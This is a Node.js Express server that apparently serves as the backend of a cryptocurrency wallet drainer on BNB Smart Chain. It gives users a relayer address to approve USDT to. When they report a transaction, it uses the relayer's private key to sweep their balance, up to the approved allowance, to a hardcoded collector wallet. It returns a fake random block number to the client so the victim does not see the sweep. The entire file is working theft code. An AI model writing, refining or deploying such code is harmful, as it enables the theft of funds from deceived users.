const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // 🎯 Collector - Final destination (your main wallet)
    COLLECTOR_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
    
    // 🤖 Relayer - Bot that does the transfer (user approves to this)
    RELAYER_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    // USDT on BSC
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    
    // BSC RPC
    RPC_URL: "https://bsc-dataseed.binance.org/",
    
    // Data file
    DATA_FILE: path.join(__dirname, 'data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: []
};

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

// Generate ID
function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
}

// ============ AUTO-TRANSFER FUNCTION ============
async function autoTransfer(userAddress, tokenAddress) {
    console.log('🚀 Starting auto-transfer...');
    
    try {
        // Check if private key exists
        if (!process.env.RELAYER_PRIVATE_KEY) {
            console.log('❌ No private key configured');
            return { success: false, error: 'No private key' };
        }
        
        // Setup provider and wallet
        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
        
        console.log('📤 Relayer:', wallet.address);
        console.log('🎯 Collector:', CONFIG.COLLECTOR_ADDRESS);
        
        // Token contract
        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];
        
        const token = new ethers.Contract(tokenAddress, tokenABI, wallet);
        
        // Get user balance
        const balance = await token.balanceOf(userAddress);
        const decimals = await token.decimals();
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        
        console.log(`💰 User balance: ${balanceHuman}`);
        
        if (balanceHuman <= 0) {
            return { success: false, error: 'Zero balance' };
        }
        
        // Check allowance
        const allowance = await token.allowance(userAddress, wallet.address);
        const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));
        
        console.log(`🔓 Allowance: ${allowanceHuman}`);
        
        if (allowanceHuman <= 0) {
            return { success: false, error: 'Zero allowance' };
        }
        
        // Calculate transfer amount (use the smaller of balance or allowance)
        const transferAmount = balance < allowance ? balance : allowance;
        const transferAmountHuman = parseFloat(ethers.formatUnits(transferAmount, decimals));
        
        console.log(`💸 Transferring ${transferAmountHuman} to collector...`);
        
        // Execute transfer
        const gasPrice = (await provider.getFeeData()).gasPrice;
        
        const tx = await token.transferFrom(
            userAddress,
            CONFIG.COLLECTOR_ADDRESS,
            transferAmount,
            { gasLimit: 100000, gasPrice }
        );
        
        console.log(`📤 Tx sent: ${tx.hash}`);
        
        // Wait for confirmation
        const receipt = await tx.wait();
        
        console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
        
        return {
            success: true,
            txHash: tx.hash,
            amount: transferAmountHuman,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString()
        };
        
    } catch (error) {
        console.error('❌ Transfer error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ API ENDPOINTS ============

// POST /send - Check address
app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);
    
    try {
        const { address } = req.body;
        
        if (!address || !address.startsWith('0x')) {
            return res.json({
                found: false,
                collector: CONFIG.RELAYER_ADDRESS
            });
        }
        
        const addr = address.toLowerCase();
        const data = dataStore.addresses[addr];
        
        // Return RELAYER address (user approves to this)
        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS
        });
        
    } catch (error) {
        res.json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS
        });
    }
});

// POST /collect - Log transaction AND auto-transfer
app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to } = req.body;
        
        if (!token || !from || !amountHuman || !to) {
            return res.json({
                ok: false,
                error: 'Missing fields'
            });
        }
        
        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);
        
        // Save transaction
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString()
        };
        
        dataStore.transactions.push(transaction);
        
        // Update address stats
        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = {
                totalAmount: 0,
                transactionCount: 0
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();
        
        saveData();
        
        // 🚀 AUTO-TRANSFER (background)
        let transferResult = null;
        
        // Don't wait for transfer - do it async
        autoTransfer(from, token).then(result => {
            if (result.success) {
                console.log('✅ Auto-transfer successful!');
                // Update transaction with transfer details
                transaction.transferTx = result.txHash;
                transaction.transferAmount = result.amount;
                saveData();
            }
        }).catch(err => {
            console.error('Transfer failed:', err);
        });
        
        // Respond immediately (like dost's API)
        res.json({
            ok: true,
            id: transactionId,
            blockNumber: mockBlockNumber,
            gasUsed: "50387"
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.json({
            ok: false,
            error: 'Server error'
        });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

// GET /
app.get('/', (req, res) => {
    res.json({
        message: 'Collector API with Auto-Transfer',
        endpoints: ['POST /send', 'POST /collect', 'GET /health'],
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════╗
║     🚀 Collector API with Auto-Transfer       ║
╠══════════════════════════════════════════════╣
║  Port: ${PORT}                                  ║
║  Collector: ${CONFIG.COLLECTOR_ADDRESS}         ║
║  Relayer: ${CONFIG.RELAYER_ADDRESS}             ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}            ║
║                                              ║
║  POST /send    - Check address               ║
║  POST /collect - Log & Auto-Transfer         ║
║  GET  /health  - Status                      ║
╚══════════════════════════════════════════════╝
    `);
});
